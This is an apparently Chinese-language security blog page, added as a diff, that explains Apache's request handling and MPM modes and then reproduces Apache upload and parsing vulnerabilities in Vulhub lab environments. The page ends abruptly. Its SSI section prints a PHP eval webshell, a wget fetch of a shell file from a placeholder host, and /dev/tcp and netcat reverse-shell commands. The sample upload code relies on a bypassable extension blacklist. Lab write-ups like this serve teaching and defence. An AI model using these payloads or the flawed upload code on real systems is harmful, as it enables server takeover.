@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="/images/icon.jpg">
+  
+  <title>java安全-apache | QWQ0QWQ&#39;s blog</title>
+  
+  <meta name="author" content="QWQ0QWQ" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="java安全" />
+  
+  <meta name="description" content="java安全-apache什么是apacheApache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一 单次web服务访问流程  Apache的目录结构  bin——-存放常用的命令工具，例如httpd cgi-bin—存放Linux下常用的命令，例如xxx.sh conf——Linux的配置相关文">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java安全-apache">
+<meta property="og:url" content="https://qwq0qwq.github.io/2024/02/12/java%E5%AE%89%E5%85%A8-apache/index.html">
+<meta property="og:site_name" content="QWQ0QWQ&#39;s blog">
+<meta property="og:description" content="java安全-apache什么是apacheApache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一 单次web服务访问流程  Apache的目录结构  bin——-存放常用的命令工具，例如httpd cgi-bin—存放Linux下常用的命令，例如xxx.sh conf——Linux的配置相关文">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://qwq0qwq.github.io/images/icon.jpg">
+<meta property="article:published_time" content="2024-02-12T15:21:34.000Z">
+<meta property="article:modified_time" content="2024-02-12T15:22:44.721Z">
+<meta property="article:author" content="QWQ0QWQ">
+<meta property="article:tag" content="java安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://qwq0qwq.github.io/images/icon.jpg">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
+    <script src="/js/kr-dark.min.js"></script>
+  
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" media="all"></script>
+  
+  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
+  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/cover1.jpg');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">QWQ0QWQ&#39;s blog</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>QWQ0QWQ&#39;s blog</h2> <br />
+                        <span></span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article itemscope itemtype="https://schema.org/Article">
+    
+    <link itemprop="mainEntityOfPage" href="https://qwq0qwq.github.io/2024/02/12/java%E5%AE%89%E5%85%A8-apache/">
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">java安全-apache</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><time datetime="2024-02-12T15:21:34.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2024-02-12</time></li>
+                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
+                    <i class="fa fa-user"></i> 作者 <span itemprop="name">QWQ0QWQ</span>
+                </li>
+                
+                    <li>
+                        <i class="fa fa-edit"></i> 
+                        
+                        
+                            ~14.18K
+                        
+                        字
+                    </li>
+                
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                <div class="icon"><i class="fa fa-warning"></i></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1707751364721"></time> 前，其中的内容可能需要更新。</p></div>
+            </div>
+            
+            
+            
+            <hr />
+            <div itemprop="articleBody"><h1 id="java安全-apache"><a href="#java安全-apache" class="headerlink" title="java安全-apache"></a>java安全-apache</h1><h2 id="什么是apache"><a href="#什么是apache" class="headerlink" title="什么是apache"></a>什么是apache</h2><p>Apache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一</p>
+<p>单次web服务访问流程</p>
+<p><img src="https://s2.51cto.com/images/202201/e88929b454a9f88a0cf47293c2112612c96252.png?x-oss-process=image/watermark,size_14,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=/format,webp" alt="img"></p>
+<p><strong>Apache的目录结构</strong></p>
+<ul>
+<li>bin——-存放常用的命令工具，例如httpd</li>
+<li>cgi-bin—存放Linux下常用的命令，例如xxx.sh</li>
+<li>conf——Linux的配置相关文件，例如httpd.conf</li>
+<li>error—–错误记录</li>
+<li>htdocs—-放网站源码</li>
+<li>icons—–网站图标</li>
+<li>logs——日志</li>
+<li>manual—-手册</li>
+<li>modules—扩展模块</li>
+</ul>
+<h2 id="apcahe架构"><a href="#apcahe架构" class="headerlink" title="apcahe架构"></a>apcahe架构</h2><h3 id="Apache-处理请求的过程"><a href="#Apache-处理请求的过程" class="headerlink" title="Apache 处理请求的过程"></a>Apache 处理请求的过程</h3><p><img src="https://upload-images.jianshu.io/upload_images/1493594-44dc02e740723a50.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/912/format/webp" alt="img"></p>
+<ul>
+<li>URI Translation阶段：将请求的URL映射到本地文件系统，mod_alias模块就是在这个阶段工作</li>
+<li>Header Parsing阶段：解析header头部，mod_setenvif在这个阶段工作</li>
+<li>Access Control阶段：按照配置文件设定的策略对用户进行认证，并设定用户名区域，模块可以在这阶段实现认证方法。</li>
+<li>Authorization阶段：根据配置文件检查是否允许认证过的用户执行请求的操作，模块可以在这阶段实现用户权限管理的方法</li>
+<li>MIME Type Checking阶段 ：根据请求资源的MIME类型的相关规则，将文件交由相应的处理模块。</li>
+<li>Fix Up 阶段：模块在内容生成器之前，运行必要的处理流程</li>
+<li>Response阶段 ：生成响应报文。</li>
+<li>Logging阶段 ：在响应客户端后记录事务</li>
+<li>CleanUp阶段 ：清除请求后遗留的环境，如文件、目录的处理或者Socket的关闭等。</li>
+</ul>
+<h3 id="Apache-生命周期"><a href="#Apache-生命周期" class="headerlink" title="Apache 生命周期"></a>Apache 生命周期</h3><p><img src="https://upload-images.jianshu.io/upload_images/1493594-5e069853be722087.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/616/format/webp" alt="img"></p>
+<ul>
+<li>启动阶段：Apache解析配置文件（如http.conf以及Include指令设定的配置文件等），模块加载(例如mod_php.so,mod_perl.so等)和系统资源初始化（例如日志文件、共享内存段等）工作。在这个阶段，Apache为了获得系统资源最大的使用权限，将以特权用户root（X系统）或超级管理员administrator(Windows系统)完成启动。</li>
+<li>运行阶段：在这个阶段，Apache为了获得系统资源最大的使用权限，将以特权用户root（X系统）或超级管理员administrator(Windows系统)完成启动。分11个阶段处理用户的请求。</li>
+</ul>
+<h3 id="Apache-的两种工作模式"><a href="#Apache-的两种工作模式" class="headerlink" title="Apache 的两种工作模式"></a>Apache 的两种工作模式</h3><h4 id="1-什么是MPM"><a href="#1-什么是MPM" class="headerlink" title="1.什么是MPM"></a>1.什么是MPM</h4><p>MPM（Multi-Processing Modules，多路处理模块）是Apache的核心组件之一，Apache通过MPM来使用操作系统的资源，对进程和线程池进行管理。Apache为了能够获得更好的运行性能，针对不同的平台 (Unix&#x2F;Linux、Window)提供了不同的MPM，用户可以根据实际情况进行选择，其中最常使用的MPM有 prefork和worker两种。</p>
+<h4 id="2-Prefork"><a href="#2-Prefork" class="headerlink" title="2.Prefork"></a>2.Prefork</h4><ul>
+<li><p>工作原理：Prefork是非线程、预生成进程型MPM，会预先启动一些子进程，每个子进程一个时间只能处理一个请求，并且会根据并发请求数量动态生成更多子进程</p>
+</li>
+<li><p>配置参数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">StartServices    服务器启动默认启动的子进程；</span><br><span class="line"></span><br><span class="line">MinSpareServers    最小空闲进程数量；</span><br><span class="line"></span><br><span class="line">MaxSpareServers    最大空闲进程数量；</span><br><span class="line"></span><br><span class="line">MaxClients     最高的并发量；</span><br><span class="line"></span><br><span class="line">ServerLimit    最大限制的并发量；</span><br><span class="line"></span><br><span class="line">MaxRequestsPerChild      每个子进程默认最多处理多少个请求。当达到设定值时，这个进程就会被<span class="built_in">kill</span>掉，重新生成一个新的进程（避免内存泄露等安全性问题，运行太久怕出一些bug，可能出现假死，或者占用太多内存等）；</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-worker"><a href="#3-worker" class="headerlink" title="3.worker"></a>3.worker</h4></li>
+<li><p>Workder是线程化、多进程的MPM，每个进程可以生成多个线程，每个线程处理一个请求；不需要启用太多的子进程,每个进程能够拥有的线程数量是固定的。服务器会根据负载情况增加或减少进程数量。一个单独的控制进程(父进程)负责子进程的建立。每个子进程能够建立ThreadsPerChild数量的服务线程和一个监听线程，该监听线程监听接入请求并将其传递给服务线程处理和应答。</p>
+</li>
+<li><p>配置参数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">StartServers 服务器启动时建立的子进程数，默认值是<span class="string">&quot;3&quot;</span>。</span><br><span class="line"></span><br><span class="line">MaxClients  允许同时服务的最大接入请求数量(最大线程数量)。任何超过MaxClients限制的请求都将进入等候队列，默认值是<span class="string">&quot;400&quot;</span>。</span><br><span class="line"></span><br><span class="line">MinSpareThreads 最小空闲线程数,默认值是<span class="string">&quot;75&quot;</span>。</span><br><span class="line"></span><br><span class="line">MaxSpareThreads  设置最大空闲线程数。默认值是<span class="string">&quot;250&quot;</span>。</span><br><span class="line"></span><br><span class="line">ThreadsPerChild  每个子进程建立的常驻的执行线程数。默认值是25</span><br><span class="line"></span><br><span class="line">MaxRequestsPerChild  设置每个子进程在其生存期内允许处理的最大请求数量。</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="4-Prefork和Worker的比较"><a href="#4-Prefork和Worker的比较" class="headerlink" title="4.Prefork和Worker的比较"></a>4.Prefork和Worker的比较</h4><ol>
+<li>prefork方式速度要稍高于worker，然而它需要的cpu和memory资源也稍多于woker。</li>
+<li>prefork的无线程设计在某些情况下将比worker更有优势：它可以使用那些没有处理好线程安全的第三方模块，并且对于那些线程调试困难的平台而言，它也更容易调试一些。</li>
+<li>在一个高流量的HTTP服务器上，Worker MPM是个比较好的选择，因为Worker MPM的内存使用比Prefork MPM要低得多。</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ec4ca82960e7">https://www.jianshu.com/p/ec4ca82960e7</a></p>
+<h2 id="apache安全"><a href="#apache安全" class="headerlink" title="apache安全"></a>apache安全</h2><h3 id="Apache换行解析漏洞"><a href="#Apache换行解析漏洞" class="headerlink" title="Apache换行解析漏洞"></a>Apache换行解析漏洞</h3><p><strong>影响版本</strong>：Apache 2.4.0~2.4.29</p>
+<p><strong>影响说明</strong>：绕过服务器策略，上传webshell</p>
+<p><strong>环境说明</strong>：PHP5.5 、 Apache2.4.10</p>
+<p><strong>环境搭建</strong>：<br>此次环境使用docker环境搭建，环境采用地址<a href="https://link.zhihu.com/?target=https://github.com/zhangzhenfeng/vulhub/tree/master/httpd/CVE-2017-15715">Vulhub</a>，环境文件有3个</p>
+<ul>
+<li>Dockerfile(apache环境)</li>
+<li>docker-compose.yml（compose文件，在此环境中意义不大）</li>
+<li>index.php（源文件缺少前台源码，已补全）</li>
+</ul>
+<p>执行构建环境命令如下（启动后在浏览器中访问<a href="https://link.zhihu.com/?target=http://127.0.0.1:8080">http://127.0.0.1:8080</a>）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><strong>漏洞原理</strong></p>
+<p>为什么叫换行解析漏洞？是因为在上传时在文件名后缀后面加了0x0a（换行），需要注意的是3.PHP是我抓完包后手动加上的，因为后台php代码用的是$_POST[‘name’]方式获取的filename，例如如下截图</p>
+<p><img src="https://pic1.zhimg.com/80/v2-4ecd8668f846aa6b0509ded5a2588b78_720w.webp" alt="img"></p>
+<p>为什么加上0x0a就能绕过了呢？先看下index.php的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p>后台是通过黑名单方式过滤了php后缀的文件，根据最开始的知识，什么样的文件算是php文件呢？在&lt;FilesMatch .php$&gt;有定义，这句话的意思是以.php结尾的文件都算php文件，在正则中表示匹配输入字符串的结尾位置。如果设置了RegExp对象的Multiline属性，则也匹配 ‘\n’ 或 ‘\r’。<br>恰好，我们在文件末尾加了0x0a(\n)，所以被匹配成功了。<br>讲到这里有两个概念需要讲清楚：0x0a与0x0d、正则表达式的m修饰符</p>
+<ul>
+<li>0x0d、\r、CR这三者代表是回车，是同一个东西，回车的作用只是移动光标至该行的起始位置；</li>
+<li>0x0a、\n、CL这三者代表换行，是同一个东西，换行至下一行行首起始位置；<br>由上述可知，0x0a才是到下一行，所以在绕过时0x0d不起作用，你也可以在burp抓包时替换十六进制进行观察。</li>
+<li>m修饰符规定正则表达式可以执行多行匹配，m修饰符也就是RegExp对象的Multiline属性。下面举个例子：</li>
+</ul>
+<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var str=<span class="string">&quot;This is an\n Apple&quot;</span>; </span><br><span class="line">var reg=/an$/;</span><br><span class="line">console.log(str.match(reg));</span><br></pre></td></tr></table></figure>
+
+<p>由于未采用多行匹配，以上是匹配不出来的，尽管他第一行以an结尾，如果正则改为&#x2F;an$&#x2F;m即可匹配。以上是apache的换行解析漏洞的原理，但也不能称之为漏洞，因为这只是Apache的特性，只是开发或者运维人员没有使用到位。</p>
+<p><strong>漏洞复现</strong><br>接下来通过实验的方式复现整个利用过程，首先先确认环境中的配置文件是否是&lt;FilesMatch .php$&gt;，路径为&#x2F;etc&#x2F;apache2&#x2F;conf-available&#x2F;docker-php.conf，该路径取决于apache2的目录，在搭建环境的时候不同apache版本路径可能不同，在Linux下的apache目录下执行grep -rn “FilesMatch” * 即可搜索到。<em>（在FilesMatch中的定义是将.php为后缀的文件解析为PHP，如果将其改为.(php|html)$的话，html中的php也会被解析。）</em><br>按照正常的漏洞利用步骤将其复现<br>0x01 抓包／改包<br>准备工作：将浏览器的代理打开、将burpsuit打开开启抓包。<br>访问漏洞页面<a href="https://link.zhihu.com/?target=http://IP:8080/index.php">http://IP:8080/index.php</a>可以看到</p>
+<p><img src="https://pic1.zhimg.com/80/v2-17a95fd0f1c3533df7c1ec56c642cfd8_720w.webp" alt="img"></p>
+<p>点击submit进行上传，burp可以抓到</p>
+<p><img src="https://pic1.zhimg.com/80/v2-c3df365945893aa605e58927c377e110_720w.webp" alt="img"></p>
+<p>上图中最下面标红的地方是index.php代码中获取文件名的位置，但现在为空，需要填写上phpinfo.php1，后缀加1的目的是占位，下一步将1改为0x0a，点击上面红色箭头指向的Hex，将包修改为以下内容：</p>
+<p><img src="https://pic2.zhimg.com/80/v2-844c604155e2bbdbfcdb51501261eb8d_720w.webp" alt="img"></p>
+<p>改完后将数据包给服务器，此时在浏览器中访问<a href="https://link.zhihu.com/?target=http://IP:8080/phpinfo.php%0A">http://IP:8080/phpinfo.php%0a</a>便可以看到phpinfo的界面，说明利用成功。</p>
+<p><strong>在Windows下的表现</strong><br>将漏洞代码复制到windows的环境中，进行访问、抓包（和文章中在Linux的方法一样），最终会出现以下问题：</p>
+<p><img src="https://pic3.zhimg.com/80/v2-c5db07449b76d9786d7e0fc0a8daaca2_720w.webp" alt="img"></p>
+<p>根据上图可以发现，move_uploaded_file函数已经被执行了，说明我们绕过了黑名单的检测，只不过在windows创建文件的时候由于结尾是换行符，windows不允许，所以创建失败了。</p>
+<p><strong>index.php源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Apache多后缀解析漏洞"><a href="#Apache多后缀解析漏洞" class="headerlink" title="Apache多后缀解析漏洞"></a>Apache多后缀解析漏洞</h3><p><strong>影响版本</strong>：使用module模式与php结合的所有版本 apache存在未知扩展名解析漏洞，使用fastcig模式与php结合的所有版本apache不存在此漏洞。</p>
+<p><strong>影响说明</strong>：绕过服务器策略，上传webshell</p>
+<p><strong>环境说明</strong>：PHP7 、 任意版本的使用module模式与php结合的apache</p>
+<p><strong>漏洞原理</strong>：<br>什么是多后缀解析？我们来看个例子，假设访问index.php.abc，这个就是多后缀解析，Apache在特定的配置下，会将其解析为php文件。这样可以绕过后台的后缀检测，达到上传webshell的目的。那为什么会产生多后缀解析？哪个配置引起的？<br>答案是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php</span><br><span class="line">或者</span><br><span class="line">&lt;FilesMatch <span class="string">&quot;.+\.ph(ar|p|tml)&quot;</span>&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上面两个配置都可以实现解析文件名中包含.php后缀的文件，apache对文件后缀名的识别是从后向前进行匹配的，以单个.作为分隔符。当遇到不认识的后缀时继续往前，直到识别，若都不识别就不做处理。在&#x2F;etc&#x2F;mime.types中有定义哪些后缀是apache识别的。关于Apache多后缀的解释，可以看<a href="https://link.zhihu.com/?target=http://httpd.apache.org/docs/current/mod/directive-dict.html">官方文档</a>。<br>apache支持php有多种模式，常见的有module、cgi、fastcgi等，此漏洞存在于module模式。</p>
+<p><strong>漏洞复现</strong><br>复现过程非常简单，将webshell后缀名改为<a href="https://link.zhihu.com/?target=http://xxx.php.xxx">http://xxx.php.xxx</a>上传即可，如果程序验证必须要图片文件，可以修改为xxx.php.png。效果截图：</p>
+<p><img src="https://pic3.zhimg.com/80/v2-1ad1272bdd781759167ce1f2c58d2ed6_720w.webp" alt="img"></p>
+<p>windows下效果相同，不再赘述。</p>
+<h3 id="Apache-SSI远程命令执行漏洞"><a href="#Apache-SSI远程命令执行漏洞" class="headerlink" title="Apache SSI远程命令执行漏洞"></a>Apache SSI远程命令执行漏洞</h3><p><strong>影响版本</strong>：Apache全版本（支持SSI与CGI）</p>
+<p><strong>影响说明</strong>：绕过服务器策略，上传webshell</p>
+<p><strong>环境说明</strong>：PHP7.1 、 Apache2.4.25</p>
+<p><strong>环境搭建</strong>：<br>此次环境使用docker环境搭建，环境采用地址<a href="https://link.zhihu.com/?target=https://github.com/zhangzhenfeng/vulhub/tree/master/httpd/ssi-rce">Vulhub</a>，环境文件有2个</p>
+<ul>
+<li>docker-compose.yml</li>
+<li>upload.php</li>
+</ul>
+<p>执行构建环境命令如下（启动后在浏览器中访问<a href="https://link.zhihu.com/?target=http://127.0.0.1:8080">http://127.0.0.1:8080</a>）</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><strong>漏洞原理</strong><br>SSI（server-side includes）:是放置在HTML页面中的指令，它可以将动态生成的内容添加到现有的HTML页面，而不必通过CGI程序或其他动态技术来提供整个页面。以上是定义采用在Apache官网对<a href="https://link.zhihu.com/?target=https://httpd.apache.org/docs/2.4/howto/ssi.html">SSI的定义</a>，说白了就是可以在HTML中加入特定的指令，也可以引入其他的页面。开启SSI需要单独配置Apache，可以参考<a href="https://link.zhihu.com/?target=https://httpd.apache.org/docs/2.4/howto/ssi.html">SSI配置</a>。<br>SSI可以完成查看时间、文件修改时间、CGI程序执行结果、执行系统命令、连接数据库等操作，功能非常强大。<br>我们要利用的就是SSI执行系统命令的功能，正常的一个包含SSI指令的文件，可以如下内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;!--<span class="comment">#exec cmd=&quot;whoami&quot; --&gt;</span></span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
+
+<p>文件名保存为test.shtml，这个后缀取决于Apache的配置，默认是此后缀。<br>当后台对扩展名校验不严格时，可以上传此类型文件，达到执行命令，获取webshell的目的。执行效果：</p>
+<p><img src="https://pic1.zhimg.com/80/v2-ebadded85bd12ddb13481a3cf4d86d80_720w.webp" alt="img"></p>
+<p>上传webshell：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;wget http://xxx/shell.txt | rename shell.txt shell.php&quot; --&gt;</span><br><span class="line">echo &#x27;&lt;?php @eval($_POST[margin]);?&gt;&#x27; &gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p>反弹shell：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;/bin/bash -i &gt; /dev/tcp/192.168.0.118/8888 0&lt;&amp;1 2&gt;&amp;1&quot; --&gt;</span><br><span class="line">&lt;!--#exec cmd=&quot;nc x.x.x.x 8888 -e /bin/bash&quot;--&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Apache多后缀解析漏洞（apache-parsing-vulnerability）"><a href="#Apache多后缀解析漏洞（apache-parsing-vulnerability）" class="headerlink" title="Apache多后缀解析漏洞（apache_parsing_vulnerability）"></a>Apache多后缀解析漏洞（apache_parsing_vulnerability）</h3><h4 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>apache httpd支持一个文件多个后缀，windows对于多后缀的识别是看最后一个“.”之后的后缀名。apache对于多后缀文件的识别是从后往前识别，最后一个后缀不能被识别时，会往前识别</p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><ul>
